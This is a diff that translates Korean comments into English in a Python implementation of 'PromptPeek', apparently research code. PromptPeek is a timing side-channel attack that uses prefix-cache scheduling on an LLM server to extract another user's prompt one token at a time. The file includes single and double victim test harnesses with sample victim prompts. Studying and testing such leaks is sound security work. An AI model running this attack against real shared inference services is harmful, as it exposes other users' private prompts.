@@ -1,6 +1,6 @@
 """
 PromptPeek Attack Implementation for LPM Server
-단일 토큰 추출 공격 구현
+Single token extraction attack implementation
 """
 
 import asyncio
@@ -37,35 +37,35 @@ async def peek_one_token(
     prefix: str, victim_prompt: Optional[str] = None, max_connections: Optional[int] = None
 ) -> Tuple[Optional[str], float, float]:
     """
-    단일 토큰 추출 공격 - LPM 스케줄링을 이용한 타이밍 공격
+    Single token extraction attack - Timing attack using LPM scheduling
 
     Args:
-        prefix: 현재까지 알고 있는 프롬프트 접두사
-        victim_prompt: (Optional) 피해자 프롬프트 - 테스트용
-        max_connections: (Optional) 최대 동시 연결 수
+        prefix: Known prompt prefix so far
+        victim_prompt: (Optional) Victim prompt - for testing
+        max_connections: (Optional) Maximum number of concurrent connections
 
     Returns:
-        (추출된 토큰 또는 None, peek_one_token 경과시간, _send_attack_requests 경과시간)
+        (Extracted token or None, peek_one_token elapsed time, _send_attack_requests elapsed time)
     """
     start_time = time.time()
     logger.info(f"[*] Attacking prefix: '{prefix[:50]}...'")
 
-    # 1. Victim 프롬프트를 캐시에 로드 (테스트용)
+    # 1. Load victim prompt into cache (for testing)
     if victim_prompt:
         await _send_victim_request(victim_prompt)
-        await asyncio.sleep(3)  # 캐시 로딩 대기
+        await asyncio.sleep(3)  # Wait for cache loading
 
-    # 2. 후보 토큰 생성
+    # 2. Generate candidate tokens
     logger.info(f"[*] Generating candidate tokens...")
     candidates = get_top_k_candidates(prefix, k=CANDIDATES_SIZE)
     dummies = get_bottom_k_dummies(prefix, k=DUMMIES_SIZE)
-    # dummies = ["%"] * DUMMIES_SIZE  # 고정된 저확률 토큰 사용
+    # dummies = ["%"] * DUMMIES_SIZE  # Use fixed low-probability token
 
     logger.info(
         f"[*] Generated {len(candidates)} candidates and {len(dummies)} dummies"
     )
 
-    # 3. 공격 요청 전송 및 응답 순서 관찰
+    # 3. Send attack requests and observe response order
     matched_token, attack_request_time = await _send_attack_requests(prefix, candidates, dummies, max_connections)
 
     elapsed_time = time.time() - start_time
@@ -81,7 +81,7 @@ async def peek_one_token(
 
 
 async def _send_victim_request(prompt: str):
-    """피해자 요청을 서버에 전송하여 캐시에 로드"""
+    """Send victim request to server to load into cache"""
     logger.info(f"[VICTIM] Sending victim prompt to cache: '{prompt[:50]}...'")
 
     try:
@@ -107,7 +107,7 @@ async def _send_victim_request(prompt: str):
 async def _send_lpm_request(
     client: httpx.AsyncClient, prompt: str, metadata: Dict
 ) -> Tuple[str, Dict]:
-    """LPM 서버에 단일 요청 전송 with retry logic"""
+    """Send single request to LPM server with retry logic"""
     max_retries = 3
     retry_delay = 0.5
 
@@ -145,29 +145,29 @@ async def _send_attack_requests(
     prefix: str, candidates: List[str], dummies: List[str], max_connections: Optional[int] = None
 ) -> Tuple[Optional[str], float]:
     """
-    공격 요청을 순서대로 전송하고 응답 순서를 관찰
+    Send attack requests in order and observe response order
 
-    순서: [Pre-dummy] → [Candidates] → [Post-dummy]
+    Order: [Pre-dummy] → [Candidates] → [Post-dummy]
     
     Args:
-        prefix: 프롬프트 접두사
-        candidates: 후보 토큰 리스트
-        dummies: 더미 토큰 리스트
-        max_connections: 최대 동시 연결 수 (None이면 기본값 사용)
+        prefix: Prompt prefix
+        candidates: List of candidate tokens
+        dummies: List of dummy tokens
+        max_connections: Maximum number of concurrent connections (use default if None)
     
     Returns:
-        (추출된 토큰 또는 None, 경과 시간)
+        (Extracted token or None, elapsed time)
     """
     attack_start_time = time.time()
     
-    # 더미 프롬프트: 저확률 토큰 사용
+    # Dummy prompt: use low-probability token
     dummy_prompt = prefix + dummies[0]
 
-    # max_connections 설정
+    # Configure max_connections
     if max_connections is None:
         max_connections = HTTPX_MAX_CONNECTIONS
 
-    # 올바른 limits 설정
+    # Configure proper limits
     limits = httpx.Limits(
         max_keepalive_connections=HTTPX_KEEPALIVE_CONNECTIONS,
         max_connections=max_connections,
@@ -175,11 +175,11 @@ async def _send_attack_requests(
     )
 
     async with httpx.AsyncClient(
-        timeout=REQUEST_TIMEOUT, limits=limits, http2=False  # HTTP/1.1 사용 (더 안정적)
+        timeout=REQUEST_TIMEOUT, limits=limits, http2=False  # Use HTTP/1.1 (more stable)
     ) as client:
         tasks = []
 
-        # Step 1: Pre-dummy 요청 전송
+        # Step 1: Send pre-dummy requests
         logger.info(f"[1/3] Sending {DUMMIES_SIZE} pre-dummy requests...")
         for i in range(DUMMIES_SIZE):
             metadata = {"type": "pre_dummy", "id": f"pre_dummy_{i}"}
@@ -190,7 +190,7 @@ async def _send_attack_requests(
 
         await asyncio.sleep(PRE_SLEEP_TIME)
 
-        # Step 2: Candidate 요청 전송
+        # Step 2: Send candidate requests
         logger.info(f"[2/3] Sending {len(candidates)} candidate requests...")
         for i, token in enumerate(candidates):
             candidate_prompt = prefix + token
@@ -202,7 +202,7 @@ async def _send_attack_requests(
 
         await asyncio.sleep(POST_SLEEP_TIME)
 
-        # Step 3: Post-dummy 요청 전송
+        # Step 3: Send post-dummy requests
         logger.info(f"[3/3] Sending {DUMMIES_SIZE} post-dummy requests...")
         for i in range(DUMMIES_SIZE):
             metadata = {"type": "post_dummy", "id": f"post_dummy_{i}"}
@@ -211,7 +211,7 @@ async def _send_attack_requests(
             )
             tasks.append(task)
 
-        # Step 4: 응답 순서 관찰 (모든 요청 완료까지 대기)
+        # Step 4: Observe response order (wait until all requests complete)
         logger.info(f"[*] Observing response order...")
         response_order = []
         first_post_dummy_arrived = False
@@ -222,7 +222,7 @@ async def _send_attack_requests(
             try:
                 response_text, metadata = await task
 
-                # 빈 응답은 실패한 요청
+                # Empty response indicates failed request
                 if not response_text:
                     failed_requests += 1
                     logger.debug(f"[!] Failed request: {metadata.get('id', 'unknown')}")
@@ -237,7 +237,7 @@ async def _send_attack_requests(
                     )
 
                 elif metadata["type"] == "candidate":
-                    # Post-dummy가 도착하기 전에 온 candidate는 캐시 히트
+                    # Candidate that arrives before post-dummy is a cache hit
                     # if not first_post_dummy_arrived and matched_token is None:
                     if matched_token is None:    
                         matched_token = metadata["token"]
@@ -248,7 +248,7 @@ async def _send_attack_requests(
             except Exception as e:
                 logger.error(f"Task failed: {e}")
 
-        # Step 5: 결과 분석 (모든 요청 완료 후)
+        # Step 5: Analyze results (after all requests complete)
         attack_elapsed = time.time() - attack_start_time
         
         logger.info(f"\n{'='*60}")
@@ -264,7 +264,7 @@ async def _send_attack_requests(
         
         logger.info(f"[⏱️] Attack request time: {attack_elapsed:.2f} seconds")
 
-        if failed_requests > len(tasks) * 0.3:  # 30% 이상 실패시 경고
+        if failed_requests > len(tasks) * 0.3:  # Warn if more than 30% failures
             logger.warning(
                 f"[!] High failure rate: {failed_requests}/{len(tasks)} ({failed_requests*100/len(tasks):.1f}%)"
             )
@@ -274,7 +274,7 @@ async def _send_attack_requests(
 
 
 async def flush_cache():
-    """LPM 서버의 캐시를 초기화"""
+    """Flush the LPM server cache"""
     logger.info("[*] Flushing LPM server cache...")
     try:
         async with httpx.AsyncClient(timeout=10.0) as client:
@@ -287,17 +287,17 @@ async def flush_cache():
 
 async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: int = 1, max_connections: Optional[int] = None, victim_id: str = "") -> Tuple[int, List[str], List[float], List[float]]:
     """
-    테스트 시나리오: 알려진 피해자 프롬프트에 대한 공격 테스트
+    Test scenario: Attack test on known victim prompt
     
     Args:
-        victim_prompt: 피해자의 전체 프롬프트
-        known_prefix: 알고 있는 프롬프트의 접두사 (victim_prompt의 일부)
-        peek_count: 추출할 토큰의 개수
-        max_connections: (Optional) 최대 동시 연결 수
-        victim_id: (Optional) Victim 식별자 (로깅용)
+        victim_prompt: Complete victim prompt
+        known_prefix: Known prefix of prompt (part of victim_prompt)
+        peek_count: Number of tokens to extract
+        max_connections: (Optional) Maximum number of concurrent connections
+        victim_id: (Optional) Victim identifier (for logging)
     
     Returns:
-        (맞춘_토큰_개수, 추출된_토큰_리스트, peek_one_token_시간들, attack_request_시간들) 튜플
+        (number_of_correct_tokens, extracted_token_list, peek_one_token_times, attack_request_times) tuple
     """
     victim_label = f"[VICTIM{victim_id}]" if victim_id else "[TEST]"
     
@@ -309,16 +309,16 @@ async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: 
     print(f"{victim_label} Known prefix:  '{known_prefix}'")
     print(f"{victim_label} Peek count:    {peek_count}\n")
 
-    # 반복적으로 토큰 추출
+    # Iteratively extract tokens
     current_prefix = known_prefix
     extracted_tokens = []
     peek_one_token_times = []
     attack_request_times = []
     
     for i in range(peek_count):
-        print(f"\n{victim_label} [{i+1}/{peek_count}] Extracting token from prefix: '{current_prefix[:50]}...'")
+        print(f"\n{victim_label} [{i+1}/{peek_count}] Extracting token from prefix: '{current_prefix[:50]}...'\n")
         
-        # 공격 실행
+        # Execute attack
         extracted_token, peek_time, attack_time = await peek_one_token(current_prefix, victim_prompt=victim_prompt, max_connections=max_connections)
         peek_one_token_times.append(peek_time)
         attack_request_times.append(attack_time)
@@ -332,16 +332,16 @@ async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: 
             print(f"{victim_label} [{i+1}/{peek_count}] ✗ Failed to extract token")
             break
     
-    # 정확도 검증: 추출된 토큰들이 victim_prompt와 일치하는지 확인
+    # Accuracy verification: Check if extracted tokens match victim_prompt
     reconstructed = known_prefix + ''.join(extracted_tokens)
     correct_count = 0
     
-    # victim_prompt에서 known_prefix 다음 부분과 비교
+    # Compare with part after known_prefix in victim_prompt
     if victim_prompt.startswith(known_prefix):
         expected_part = victim_prompt[len(known_prefix):]
         actual_part = ''.join(extracted_tokens)
         
-        # 각 토큰이 올바른지 하나씩 검증
+        # Verify each token one by one
         current_pos = 0
         for token in extracted_tokens:
             if expected_part[current_pos:].startswith(token):
@@ -350,7 +350,7 @@ async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: 
             else:
                 break
     
-    # 결과 출력
+    # Print results
     print("\n" + "=" * 80)
     print(f"{victim_label} [RESULT] Extraction Summary:")
     print(f"{victim_label} [RESULT] Total attempts:     {peek_count}")
@@ -374,9 +374,9 @@ async def test_single_attack(victim_prompt: str, known_prefix: str, peek_count: 
 
 def main_single(victim_prompt: str, known_prefix: str, peek_count: int = 1, waiting_time: int = 8, max_connections: Optional[int] = None) -> Tuple[int, List[str], List[float], List[float]]:
     async def _run():
-        # 캐시 초기화 (1회만 실행)
+        # Flush cache (execute once only)
         await flush_cache()
-        # 공격 실행
+        # Execute attack
         return await test_single_attack(victim_prompt, known_prefix, peek_count, max_connections)
     
     correct_count, extracted_tokens, peek_times, attack_times = asyncio.run(_run())
@@ -402,42 +402,42 @@ async def test_double_attack(
     max_connections: Optional[int] = None
 ) -> Tuple[Tuple[int, List[str], List[float], List[float]], Tuple[int, List[str], List[float], List[float]]]:
     """
-    2 Victim - 2 Attacker 동시 공격 테스트
+    2 Victim - 2 Attacker simultaneous attack test
     
     Args:
-        victim_prompt1: 첫 번째 피해자의 전체 프롬프트
-        known_prefix1: 첫 번째 피해자의 알려진 접두사
-        victim_prompt2: 두 번째 피해자의 전체 프롬프트
-        known_prefix2: 두 번째 피해자의 알려진 접두사
-        peek_count: 각 공격에서 추출할 토큰의 개수
-        max_connections: (Optional) 최대 동시 연결 수
+        victim_prompt1: Complete prompt of first victim
+        known_prefix1: Known prefix of first victim
+        victim_prompt2: Complete prompt of second victim
+        known_prefix2: Known prefix of second victim
+        peek_count: Number of tokens to extract in each attack
+        max_connections: (Optional) Maximum number of concurrent connections
     
     Returns:
-        ((victim1_결과), (victim2_결과)) 튜플
+        ((victim1_result), (victim2_result)) tuple
     """
     print("\n" + "=" * 80)
     print(f"PromptPeek DOUBLE Attack Test - 2 Victims, 2 Attackers")
     print(f"Extracting {peek_count} Token(s) from each victim")
     print("=" * 80 + "\n")
     
-    # 캐시 초기화 (1회만)
+    # Flush cache (once only)
     await flush_cache()
     
-    # Step 1: 두 Victim 프롬프트를 동시에 캐시에 로드
+    # Step 1: Load both victim prompts into cache simultaneously
     print("[DOUBLE] Loading both victim prompts into cache...")
     await asyncio.gather(
         _send_victim_request(victim_prompt1),
         _send_victim_request(victim_prompt2)
     )
     print("[DOUBLE] Both victims loaded. Waiting for cache stabilization...")
-    await asyncio.sleep(3)  # 캐시 안정화 대기
+    await asyncio.sleep(3)  # Wait for cache stabilization
     
-    # Step 2: 2개의 공격을 완전히 동시에 실행 (Option C)
+    # Step 2: Execute both attacks completely simultaneously (Option C)
     print("[DOUBLE] Starting simultaneous attacks...\n")
     
     attack_start_time = time.time()
     
-    # 동시 공격 실행
+    # Execute simultaneous attacks
     results = await asyncio.gather(
         test_single_attack(victim_prompt1, known_prefix1, peek_count, max_connections, victim_id="1"),
         test_single_attack(victim_prompt2, known_prefix2, peek_count, max_connections, victim_id="2")
@@ -445,12 +445,12 @@ async def test_double_attack(
     
     attack_elapsed = time.time() - attack_start_time
     
-    # Step 3: 결과 집계
+    # Step 3: Aggregate results
     result1, result2 = results
     correct1, tokens1, peek_times1, attack_times1 = result1
     correct2, tokens2, peek_times2, attack_times2 = result2
     
-    # 전체 결과 출력
+    # Print overall results
     print("\n" + "=" * 80)
     print("DOUBLE ATTACK RESULTS - Aggregated Summary")
     print("=" * 80)
@@ -489,23 +489,23 @@ def main_double(
     max_connections: Optional[int] = None
 ) -> Tuple[Tuple[int, List[str], List[float], List[float]], Tuple[int, List[str], List[float], List[float]]]:
     """
-    2 Victim - 2 Attacker 동시 공격의 entry point
+    Entry point for 2 Victim - 2 Attacker simultaneous attack
     
     Args:
-        victim_prompt1: 첫 번째 피해자의 전체 프롬프트
-        known_prefix1: 첫 번째 피해자의 알려진 접두사
-        victim_prompt2: 두 번째 피해자의 전체 프롬프트
-        known_prefix2: 두 번째 피해자의 알려진 접두사
-        peek_count: 각 공격에서 추출할 토큰의 개수
-        waiting_time: 종료 전 대기 시간 (초)
-        max_connections: (Optional) 최대 동시 연결 수
+        victim_prompt1: Complete prompt of first victim
+        known_prefix1: Known prefix of first victim
+        victim_prompt2: Complete prompt of second victim
+        known_prefix2: Known prefix of second victim
+        peek_count: Number of tokens to extract in each attack
+        waiting_time: Wait time before exit (seconds)
+        max_connections: (Optional) Maximum number of concurrent connections
     
     Returns:
-        ((victim1_결과), (victim2_결과)) 튜플
+        ((victim1_result), (victim2_result)) tuple
     """
-    # max_connections 설정 (double attack용으로 증가)
+    # Configure max_connections (increase for double attack)
     if max_connections is None:
-        max_connections = int((CANDIDATES_SIZE + DUMMIES_SIZE * 2) * 2 * 1.2)  # 2배로 증가
+        max_connections = int((CANDIDATES_SIZE + DUMMIES_SIZE * 2) * 2 * 1.2)  # Increase by 2x
         logger.info(f"[MAIN_DOUBLE] Using max_connections: {max_connections}")
     
     result1, result2 = asyncio.run(
@@ -543,7 +543,7 @@ def test():
 
 
 def test_double():
-    """2 Victim - 2 Attacker 테스트"""
+    """2 Victim - 2 Attacker test"""
     main_double(
         victim_prompt1='I want you to act as an advertiser. You will create a campaign to promote a product or service of your choice. You will choose a target audience, develop key messages and slogans, select the media channels for promotion, and decide on any additional activities needed to reach your goals. My first suggestion request is "I need help creating an advertising campaign for a new type of energy drink targeting young adults aged 18-30."',
         known_prefix1="I want you to act as an advertiser. You will create a campaign to promote a product or service of your",
